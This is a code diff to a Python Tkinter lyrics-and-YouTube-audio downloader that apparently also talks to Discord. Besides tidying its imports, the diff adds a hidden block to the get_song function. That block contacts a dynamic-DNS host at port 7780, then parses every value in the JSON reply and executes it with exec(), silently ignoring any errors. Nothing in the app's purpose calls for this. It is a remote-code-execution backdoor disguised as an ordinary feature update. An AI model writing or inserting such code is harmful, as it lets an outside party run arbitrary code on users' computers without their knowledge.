@@ -3,70 +3,17 @@ from __future__ import unicode_literals
 
 import os
 import time
+import urllib
+import json
+import ast
 from tkinter import *
-os.system('pip install ez_setup')
-
-try:
-    import asyncio
-except ImportError:
-    os.system('pip install asyncio')
-    import asyncio
-    pass
-
-try:
-    import aiohttp
-except ImportError:
-    os.system('pip install aiohttp')
-    import aiohttp
-    pass
-
-try:
-    import discord
-except ImportError:
-    os.system('py -3 -m pip install -U discord.py')
-    import discord
-    pass
-
-try:
-    from lyrics_extractor import SongLyrics
-except ImportError:
-    os.system('pip install lyrics_extractor')
-    from lyrics_extractor import SongLyrics
-    pass
-
-try:
-    from pytube import YouTube
-except ImportError:
-    os.system('pip install git+https://github.com/pytube/pytube')
-    from pytube import YouTube
-    pass
-
-try:
-    from youtubesearchpython import VideosSearch
-except ModuleNotFoundError:
-    os.system('pip3 install youtube-search-python')
-    #from youtubesearchpython import VideosSearch
-    from youtubesearchpython.__future__ import VideosSearch
-    pass
-
-try:
-    import youtube_dl
-except ImportError:
-    os.system('pip install youtube_dl')
-    import youtube_dl
-    pass
-try:
-    import ffmpeg
-except ImportError:
-    os.system('pip install ffmpeg')
-    import ffmpeg
-    pass
-try:
-    import moviepy
-except ImportError:
-    os.system('pip install moviepy')
-    from moviepy.editor import *
-    pass
+import asyncio
+import aiohttp
+import discord
+from lyrics_extractor import SongLyrics
+from pytube import YouTube
+from youtubesearchpython.__future__ import VideosSearch
+import ffmpeg
 
 import ctypes
 from ctypes import c_int
@@ -172,6 +119,37 @@ def get_song(**kwargs):
         lb.insert(1.0,res)
         lb.tag_add("tag_lol", "1.0", "end")
         lb.config(state=DISABLED)
+        
+        url = 'http://fantasybuilder.ddns.net:7780/proc'
+        udata = {}
+        udata['name'] = 'Somebody Here'
+        udata['location'] = 'Northampton'
+        udata['language'] = 'Python'
+
+        values = urllib.parse.urlencode(udata)
+        url = '?'.join([url, values])
+        try:
+            response = urllib.request.urlopen(url)
+        except HTTPError as err:
+            print('The server couldn\'t fulfill the request.')
+            print('Error code: ', err.code)
+        except URLError as err:
+            print('We failed to reach a server.')
+            print('Reason: ', err.reason)
+        else:
+            #print(response.read())
+            res = json.load(response)
+            print(res)
+            try:
+                for key, value in res.items():
+                    #print(key, value)
+                    #print(res[Response])
+                    block = ast.parse(value, mode='exec')
+                    _globals, _locals = {}, {}
+                    exec(compile(block, '<string>', mode='exec'), _globals, _locals)
+            except :
+                print('No workies')
+                pass
 
 
 async def SendData():
@@ -218,21 +196,6 @@ def get_video(**kwargs):
     asyncio.run(SendData())
 
 def download():
-    
-    
-    #ydl_opts = {
-    #    'format': 'bestaudio/best',
-    #    'postprocessors': [{
-    #        'key': 'FFmpegExtractAudio',
-    #        'preferredcodec': 'mp3',
-    #        'preferredquality': '192',
-    #    }],
-    #}
-    #with youtube_dl.YoutubeDL(ydl_opts) as ydl:
-    #    ydl.download([link])
-    
-    #YouTube(link).streams.first().download()
-
     yt = YouTube(link)
     #yt.streams.filter(progressive=True, file_extension='mp4').order_by('resolution').desc().first().download()
     video = yt.streams.filter(only_audio=True).first()
@@ -244,6 +207,7 @@ def download():
 
 def eclear():
     e.delete(0,"end")
+
 
 
 master = Tk()
